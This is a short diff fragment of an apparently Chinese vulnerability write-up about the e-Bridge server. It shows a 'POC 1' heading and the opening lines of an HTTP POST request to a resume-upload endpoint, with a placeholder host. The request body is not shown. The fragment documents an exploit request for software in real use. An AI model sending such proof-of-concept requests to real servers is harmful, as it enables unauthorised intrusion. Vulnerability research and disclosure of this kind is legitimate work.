@@ -34,7 +34,6 @@ C:\Users\bmth\Downloads\ebridge_install_win64_server2008R2_20200819\ebridge\file
 **不在web目录下！！！**
 
 ## POC 1
-<span data-cacheurl="" data-remoteid="" style="display: block; background: url(&quot;https://mmbiz.qpic.cn/mmbiz_svg/LHdtlaBo22eFzV7FI1PRdrXcsAyshUFaa5lJnNWUxib4iabVPPs60cQOuUZnzIFricwXLclHeC1a2dDTZYMb7rOc5JaDYj0Q87s/640?wx_fmt=svg&amp;from=appmsg&amp;tp=webp&amp;wxfrom=15&amp;wx_lazy=1&quot;) 10px 10px / 40px no-repeat rgb(40, 44, 52); height: 30px; width: 100%; margin-bottom: -7px; border-radius: 5px; visibility: visible;" data-lazy-bgimg="https://mmbiz.qpic.cn/mmbiz_svg/LHdtlaBo22eFzV7FI1PRdrXcsAyshUFaa5lJnNWUxib4iabVPPs60cQOuUZnzIFricwXLclHeC1a2dDTZYMb7rOc5JaDYj0Q87s/640?wx_fmt=svg&amp;from=appmsg" class="js_darkmode__bg__0 js_darkmode__15" data-fail="0"></span>
 ```
 POST /wxclient/app/recruit/resume/addResume?fileElementId=H HTTP/2
 Host: XXX
